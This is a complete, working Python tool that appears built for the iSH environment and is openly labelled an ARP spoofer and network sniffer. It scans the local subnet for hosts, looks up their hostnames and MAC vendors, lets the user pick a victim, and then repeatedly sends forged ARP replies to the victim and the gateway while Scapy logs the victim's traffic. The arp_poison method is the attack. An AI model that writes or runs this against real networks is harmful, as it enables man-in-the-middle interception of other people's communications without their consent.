#!/usr/bin/env python3
import threading
import time
import socket
import sys
import os
import re
import queue
import platform
import subprocess
import ipaddress
import concurrent.futures
from datetime import datetime

# Fix for Scapy on iSH - import in a specific way
import scapy.config
import scapy.route

# Now try to import scapy modules with error handling
SCAPY_AVAILABLE = False
try:
    # Set Scapy to use minimal configuration
    import scapy.all
    from scapy.all import ARP, Ether, sendp, srp
    from scapy.arch import get_if_hwaddr, get_if_addr
    
    # Try to import sniff separately (might fail)
    try:
        from scapy.all import sniff
    except:
        sniff = None
    
    SCAPY_AVAILABLE = True
    print("✓ Scapy imported successfully")
except Exception as e:
    print(f"⚠ Scapy import warning: {e}")
    SCAPY_AVAILABLE = False

# Try to import requests
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def get_available_interfaces():
    """Get network interfaces without psutil"""
    interfaces = []
    
    # Method 1: Try using /proc/net/dev (Linux)
    try:
        with open('/proc/net/dev', 'r') as f:
            for line in f:
                if ':' in line:
                    iface = line.split(':')[0].strip()
                    if not iface.startswith('lo'):
                        interfaces.append(iface)
        if interfaces:
            return interfaces
    except:
        pass
    
    # Method 2: Try using ip command
    try:
        output = subprocess.check_output(['ip', 'link', 'show'], text=True)
        for line in output.splitlines():
            if ': <' in line and 'LOOPBACK' not in line:
                iface = line.split(':')[1].strip().split('@')[0]
                if iface and iface not in interfaces:
                    interfaces.append(iface)
        if interfaces:
            return interfaces
    except:
        pass
    
    # Method 3: Try using ifconfig
    try:
        output = subprocess.check_output(['ifconfig'], text=True)
        for line in output.splitlines():
            if line and not line.startswith(' ') and 'flags=' in line:
                iface = line.split(':')[0]
                if iface != 'lo' and iface not in interfaces:
                    interfaces.append(iface)
        if interfaces:
            return interfaces
    except:
        pass
    
    # Fallback to common interface names
    common_ifaces = ['eth0', 'wlan0', 'en0']
    return [iface for iface in common_ifaces if os.path.exists(f'/sys/class/net/{iface}')]

def get_default_interface():
    """Get default interface without psutil"""
    interfaces = get_available_interfaces()
    if not interfaces:
        return ''
    
    # Try to find the default route interface
    try:
        output = subprocess.check_output(['ip', 'route'], text=True)
        for line in output.splitlines():
            if 'default via' in line:
                parts = line.split()
                if 'dev' in parts:
                    idx = parts.index('dev') + 1
                    if idx < len(parts):
                        iface = parts[idx]
                        if iface in interfaces:
                            return iface
    except:
        pass
    
    # Try route command
    try:
        output = subprocess.check_output(['route', '-n'], text=True)
        for line in output.splitlines():
            if line.startswith('0.0.0.0'):
                parts = line.split()
                if len(parts) >= 8:
                    iface = parts[-1]
                    if iface in interfaces:
                        return iface
    except:
        pass
    
    return interfaces[0] if interfaces else ''

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = None
    finally:
        s.close()
    return ip

def guess_net(ip, prefix=24):
    return str(ipaddress.ip_network(f'{ip}/{prefix}', strict=False))

def arp_scan_subprocess(cidr):
    """ARP scan using system arping command (no Scapy)"""
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        hosts = [str(ip) for ip in net.hosts()][:255]
        
        results = []
        for ip in hosts:
            try:
                # Try arping
                cmd = ['arping', '-c', '1', '-w', '1', ip]
                output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=2)
                
                # Extract MAC from output
                for line in output.decode().splitlines():
                    mac_match = re.search(r'\[([0-9a-f:]{17})\].*?(\d+\.\d+\.\d+\.\d+)', line.lower())
                    if mac_match:
                        mac = mac_match.group(1)
                        results.append({'ip': ip, 'mac': mac})
                        break
            except:
                pass
        
        return results
    except Exception as e:
        return []

def ping_once(ip):
    cmd = ['ping', '-c', '1', '-W', '1', ip]
    try:
        subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=2)
        return True
    except:
        return False

def parse_arp_table():
    """Parse ARP table"""
    entries = []
    try:
        # Try ip neigh command
        out = subprocess.check_output(['ip', 'neigh'], text=True, stderr=subprocess.DEVNULL)
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 4 and parts[2] == 'lladdr':
                ip = parts[0]
                mac = parts[3].lower()
                entries.append({'ip': ip, 'mac': mac})
    except:
        pass
    
    if not entries:
        try:
            # Try arp command
            out = subprocess.check_output(['arp', '-n'], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                m = re.search(r'(\d+\.\d+\.\d+\.\d+).*?((?:[0-9a-f]{2}:){5}[0-9a-f]{2})', line, re.I)
                if m:
                    ip = m.group(1)
                    mac = m.group(2).lower()
                    entries.append({'ip': ip, 'mac': mac})
        except:
            pass
    
    return entries

def sweep_network_ping(cidr, max_workers=50):
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        hosts = [str(ip) for ip in net.hosts()]
        if len(hosts) > 256:
            hosts = hosts[:256]
        
        alive = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = {ex.submit(ping_once, ip): ip for ip in hosts}
            for fut in concurrent.futures.as_completed(futures):
                try:
                    ip = futures[fut]
                    if fut.result():
                        alive.append(ip)
                except Exception:
                    continue
        
        arp_entries = parse_arp_table()
        arp_map = {e['ip']: e['mac'] for e in arp_entries}
        return [{'ip': ip, 'mac': arp_map.get(ip)} for ip in alive]
    except Exception as e:
        return []

def reverse_dns(ip, timeout=1.5):
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
            fut = ex.submit(socket.gethostbyaddr, ip)
            try:
                name = fut.result(timeout=timeout)[0]
                return name
            except:
                return None
    except:
        return None

def get_vendor_from_mac_api(mac):
    if not REQUESTS_AVAILABLE or not mac:
        return None
    try:
        mac_clean = mac.strip().upper().replace(':', '').replace('-', '')
        url = f'https://api.macvendors.com/{mac_clean}'
        r = requests.get(url, timeout=3)
        if r.status_code == 200 and r.text:
            return r.text.strip()
        return None
    except:
        return None

def enrich_entry(entry):
    ip = entry.get('ip')
    mac = entry.get('mac')
    res = {'ip': ip, 'mac': mac, 'hostname': None, 'vendor': None}
    
    if ip:
        res['hostname'] = reverse_dns(ip)
    
    if mac:
        res['vendor'] = get_vendor_from_mac_api(mac)
    
    return res

class ARPSpoofer:
    def __init__(self):
        self.stop_event = threading.Event()
        self.interfaces = get_available_interfaces()
        default_iface = get_default_interface()
        self.config = {
            'target_ip': '',
            'gateway_ip': '',
            'target_mac': '',
            'gateway_mac': '',
            'iface': default_iface if default_iface in self.interfaces else self.interfaces[0] if self.interfaces else '',
            'sniff_all': False,
            'protocols': ['HTTP', 'TCP', 'UDP', 'OTHER']
        }
        self.local_mac = None
        self.local_ip = None
        self.attack_thread = None
        self.capture_thread = None
        self.packet_count = 0
        
    def clear_screen(self):
        os.system('clear')
    
    def print_banner(self):
        banner = f"""
{Colors.GREEN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════╗
║                 ARP SPOOFER / NETWORK SNIFFER            ║
║                      iSH Compatible Version              ║
╚══════════════════════════════════════════════════════════╝{Colors.ENDC}
        """
        print(banner)
        
        if SCAPY_AVAILABLE:
            print(f"{Colors.GREEN}✓ Scapy available - Full ARP spoofing & capture{Colors.ENDC}")
        else:
            print(f"{Colors.WARNING}⚠ Scapy not available - Limited functionality{Colors.ENDC}")
            print(f"{Colors.WARNING}  Using ping sweep and arping instead{Colors.ENDC}")
        
        if REQUESTS_AVAILABLE:
            print(f"{Colors.GREEN}✓ Requests available - Vendor lookup enabled{Colors.ENDC}")
        else:
            print(f"{Colors.WARNING}⚠ Requests not available - No vendor lookup{Colors.ENDC}")
        print()
    
    def print_status(self, message, level="INFO"):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if level == "INFO":
            color = Colors.CYAN
        elif level == "SUCCESS":
            color = Colors.GREEN
        elif level == "WARNING":
            color = Colors.WARNING
        elif level == "ERROR":
            color = Colors.FAIL
        elif level == "SPOOF":
            color = Colors.BLUE
        else:
            color = Colors.ENDC
        
        print(f"{color}[{timestamp}] [{level}] {message}{Colors.ENDC}")
    
    def get_iface_info(self, iface):
        """Get interface info without scapy"""
        mac = None
        ip = None
        
        # Get MAC address
        try:
            with open(f'/sys/class/net/{iface}/address', 'r') as f:
                mac = f.read().strip()
        except:
            pass
        
        # Get IP address
        try:
            output = subprocess.check_output(['ip', 'addr', 'show', iface], text=True)
            for line in output.splitlines():
                if 'inet ' in line:
                    ip = line.split()[1].split('/')[0]
                    break
        except:
            pass
        
        return ip, mac
    
    def detect_gateway(self):
        """Detect gateway IP"""
        try:
            # Try ip route
            result = subprocess.check_output(['ip', 'route'], text=True)
            for line in result.splitlines():
                if 'default via' in line:
                    parts = line.split()
                    gw_idx = parts.index('via') + 1
                    if gw_idx < len(parts):
                        return parts[gw_idx]
        except:
            pass
        
        # Try route -n
        try:
            result = subprocess.check_output(['route', '-n'], text=True)
            for line in result.splitlines():
                if line.startswith('0.0.0.0'):
                    parts = line.split()
                    if len(parts) >= 2:
                        return parts[1]
        except:
            pass
        
        return None

    def find_mac_for_ip(self, ip):
        """Find MAC for IP using ARP table"""
        entries = parse_arp_table()
        for entry in entries:
            if entry['ip'] == ip:
                return entry['mac']
        return None
    
    def detect_network(self):
        """Auto-detect network configuration"""
        print(f"\n{Colors.BOLD}Network Detection:{Colors.ENDC}")
        
        # Get interface info
        self.local_ip, self.local_mac = self.get_iface_info(self.config['iface'])
        
        if self.local_ip:
            print(f"  Local IP: {Colors.GREEN}{self.local_ip}{Colors.ENDC}")
        else:
            print(f"  Local IP: {Colors.WARNING}Unknown{Colors.ENDC}")
        
        if self.local_mac:
            print(f"  Local MAC: {Colors.GREEN}{self.local_mac}{Colors.ENDC}")
        
        # Detect gateway
        gw_ip = self.detect_gateway()
        if gw_ip:
            self.config['gateway_ip'] = gw_ip
            print(f"  Gateway IP: {Colors.GREEN}{gw_ip}{Colors.ENDC}")
            
            gw_mac = self.find_mac_for_ip(gw_ip)
            if gw_mac:
                self.config['gateway_mac'] = gw_mac
                print(f"  Gateway MAC: {Colors.GREEN}{gw_mac}{Colors.ENDC}")
            else:
                print(f"  Gateway MAC: {Colors.WARNING}Not found{Colors.ENDC}")
        else:
            print(f"  Gateway IP: {Colors.WARNING}Not detected{Colors.ENDC}")
        print()
    
    def scan_ip_targets(self):
        """Scan for targets on the network"""
        if not self.local_ip:
            self.local_ip = get_local_ip()
            if not self.local_ip:
                self.print_status("Could not determine local IP", "ERROR")
                return []
        
        cidr = guess_net(self.local_ip, prefix=24)
        self.print_status(f"Scanning network: {cidr}", "INFO")
        
        results = []
        
        # Try different scanning methods
        try:
            # First try arping (system tool)
            results = arp_scan_subprocess(cidr)
            if results:
                self.print_status(f"ARPing scan: {len(results)} hosts found", "SUCCESS")
        except:
            pass
        
        if not results:
            # Fallback to ping sweep
            results = sweep_network_ping(cidr)
            self.print_status(f"Ping sweep: {len(results)} hosts found", "INFO")
        
        # Enrich results
        enriched = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futures = [ex.submit(enrich_entry, r) for r in results]
            for fut in concurrent.futures.as_completed(futures):
                try:
                    enriched.append(fut.result())
                except Exception:
                    pass
        
        return sorted(enriched, key=lambda x: x.get('ip') or '')
    
    def display_targets(self, targets):
        if not targets:
            self.print_status("No targets found", "WARNING")
            return
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}Available Targets:{Colors.ENDC}")
        print(f"{'ID':<4} {'IP':<16} {'MAC':<18} {'Hostname':<20}")
        print("-" * 60)
        
        for i, e in enumerate(targets):
            ip = e.get('ip') or '-'
            mac = e.get('mac') or '-'
            hn = (e.get('hostname') or '-')[:18]
            print(f"{i:<4} {ip:<16} {mac:<18} {hn:<20}")
        print()
    
    def validate_ip(self, ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except:
            return False
    
    def validate_mac(self, mac):
        return bool(re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac))
    
    def interactive_config(self):
        self.clear_screen()
        self.print_banner()
        
        # Interface selection
        if self.interfaces:
            print(f"\n{Colors.BOLD}Available interfaces:{Colors.ENDC}")
            for i, iface in enumerate(self.interfaces):
                print(f"  {i+1}. {iface}")
            
            while True:
                try:
                    choice = input(f"\n{Colors.CYAN}Select interface (1-{len(self.interfaces)}) [Default: 1]: {Colors.ENDC}").strip()
                    if not choice:
                        idx = 0
                    else:
                        idx = int(choice) - 1
                    
                    if 0 <= idx < len(self.interfaces):
                        self.config['iface'] = self.interfaces[idx]
                        break
                    else:
                        print(f"{Colors.FAIL}Invalid selection{Colors.ENDC}")
                except ValueError:
                    print(f"{Colors.FAIL}Please enter a number{Colors.ENDC}")
        else:
            self.config['iface'] = input(f"{Colors.CYAN}Enter interface name [eth0]: {Colors.ENDC}").strip() or 'eth0'
        
        # Auto-detect network
        self.detect_network()
        
        # Scan for targets
        targets = self.scan_ip_targets()
        
        if targets:
            self.display_targets(targets)
            
            # Mode selection
            print(f"\n{Colors.BOLD}Select mode:{Colors.ENDC}")
            print("  1. Sniff entire network")
            print("  2. Target specific device")
            
            mode = input(f"\n{Colors.CYAN}Select mode (1-2) [Default: 2]: {Colors.ENDC}").strip()
            
            if mode == "1":
                self.config['sniff_all'] = True
            else:
                self.config['sniff_all'] = False
                
                # Select target
                while True:
                    try:
                        target_id = input(f"{Colors.CYAN}Select target ID (0-{len(targets)-1}): {Colors.ENDC}").strip()
                        if target_id and 0 <= int(target_id) < len(targets):
                            target = targets[int(target_id)]
                            self.config['target_ip'] = target['ip']
                            self.config['target_mac'] = target['mac'] or ''
                            break
                        else:
                            print(f"{Colors.FAIL}Invalid target ID{Colors.ENDC}")
                    except ValueError:
                        print(f"{Colors.FAIL}Please enter a number{Colors.ENDC}")
        else:
            # Manual configuration
            self.print_status("No targets found - manual mode", "WARNING")
            
            mode = input(f"\n{Colors.CYAN}Sniff entire network? (y/n) [y]: {Colors.ENDC}").strip().lower()
            self.config['sniff_all'] = (mode != 'n')
            
            if not self.config['sniff_all']:
                # Target IP
                while True:
                    ip = input(f"{Colors.CYAN}Target IP: {Colors.ENDC}").strip()
                    if self.validate_ip(ip):
                        self.config['target_ip'] = ip
                        break
                    print(f"{Colors.FAIL}Invalid IP{Colors.ENDC}")
                
                # Target MAC
                mac = input(f"{Colors.CYAN}Target MAC (optional): {Colors.ENDC}").strip()
                if mac and self.validate_mac(mac):
                    self.config['target_mac'] = mac
                
                # Gateway IP
                if not self.config['gateway_ip']:
                    while True:
                        ip = input(f"{Colors.CYAN}Gateway IP: {Colors.ENDC}").strip()
                        if self.validate_ip(ip):
                            self.config['gateway_ip'] = ip
                            break
                        print(f"{Colors.FAIL}Invalid IP{Colors.ENDC}")
    
    def arp_poison(self):
        """ARP spoofing thread"""
        if not SCAPY_AVAILABLE:
            self.print_status("Scapy not available - cannot ARP spoof", "ERROR")
            return
        
        try:
            target = ARP(op=2, pdst=self.config['target_ip'], hwdst=self.config['target_mac'], psrc=self.config['gateway_ip'])
            gateway = ARP(op=2, pdst=self.config['gateway_ip'], hwdst=self.config['gateway_mac'], psrc=self.config['target_ip'])
            
            while not self.stop_event.is_set():
                sendp(Ether() / target, iface=self.config['iface'], verbose=False)
                sendp(Ether() / gateway, iface=self.config['iface'], verbose=False)
                
                for _ in range(10):
                    if self.stop_event.is_set():
                        break
                    time.sleep(0.1)
        except Exception as e:
            self.print_status(f"ARP spoofing error: {e}", "ERROR")

    def start(self):
        self.clear_screen()
        self.print_banner()
        
        # Check if running as root
        if os.geteuid() != 0:
            print(f"{Colors.WARNING}Warning: Not running as root. Packet capture may not work.{Colors.ENDC}")
            response = input("Continue anyway? (y/n): ").strip().lower()
            if response != 'y':
                sys.exit(1)
        
        # Interactive configuration
        self.interactive_config()
        
        # Final confirmation
        print(f"\n{Colors.BOLD}Configuration:{Colors.ENDC}")
        print(f"  Interface: {self.config['iface']}")
        print(f"  Mode: {'Full network sniff' if self.config['sniff_all'] else 'Targeted'}")
        if not self.config['sniff_all']:
            print(f"  Target IP: {self.config['target_ip']}")
            print(f"  Gateway IP: {self.config['gateway_ip']}")
        
        response = input(f"\n{Colors.CYAN}Start? (y/n): {Colors.ENDC}").strip().lower()
        if response != 'y':
            self.print_status("Aborted", "WARNING")
            sys.exit(0)
        
        # Start attack
        self.print_status("Starting...", "INFO")
        self.stop_event.clear()
        
        if not self.config['sniff_all'] and SCAPY_AVAILABLE:
            self.attack_thread = threading.Thread(target=self.arp_poison, daemon=True)
            self.attack_thread.start()
        
        if SCAPY_AVAILABLE:
            # Try to import sniff here (might work)
            try:
                from scapy.all import sniff
                self.capture_thread = threading.Thread(target=self.packet_capture, daemon=True)
                self.capture_thread.start()
                self.print_status("Capture started", "SUCCESS")
            except:
                self.print_status("Scapy sniff not available - cannot capture packets", "ERROR")
                return
        else:
            self.print_status("Scapy not available - cannot capture packets", "ERROR")
            return
        
        print(f"\n{Colors.WARNING}Press Ctrl+C to stop...{Colors.ENDC}\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def packet_capture(self):
        """Packet capture thread"""
        try:
            from scapy.all import sniff
            
            def packet_handler(pkt):
                if self.stop_event.is_set():
                    return
                
                if pkt.haslayer('IP'):
                    src = pkt['IP'].src
                    dst = pkt['IP'].dst
                    proto = pkt['IP'].proto
                    proto_str = {1: 'ICMP', 6: 'TCP', 17: 'UDP'}.get(proto, 'OTHER')
                    
                    if proto_str not in self.config['protocols']:
                        return
                    
                    if not self.config['sniff_all'] and self.config['target_ip']:
                        if src != self.config['target_ip'] and dst != self.config['target_ip']:
                            return
                    
                    info = ''
                    
                    if pkt.haslayer('TCP'):
                        info = f"Port {pkt['TCP'].sport}→{pkt['TCP'].dport}"
                    elif pkt.haslayer('UDP'):
                        info = f"Port {pkt['UDP'].sport}→{pkt['UDP'].dport}"
                    elif pkt.haslayer('ICMP'):
                        info = f"Type {pkt['ICMP'].type}"
                    
                    self.packet_count += 1
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    print(f"{Colors.GREEN}[{timestamp}] {src} → {dst} | {proto_str} | {info}{Colors.ENDC}")
            
            sniff(iface=self.config['iface'], prn=packet_handler, store=False, stop_filter=lambda x: self.stop_event.is_set())
        except Exception as e:
            self.print_status(f"Capture error: {e}", "ERROR")
    
    def stop(self):
        self.print_status("\nStopping...", "WARNING")
        self.stop_event.set()
        time.sleep(1)
        self.print_status(f"Packets captured: {self.packet_count}", "SUCCESS")

if __name__ == '__main__':
    spoofer = ARPSpoofer()
    spoofer.start()
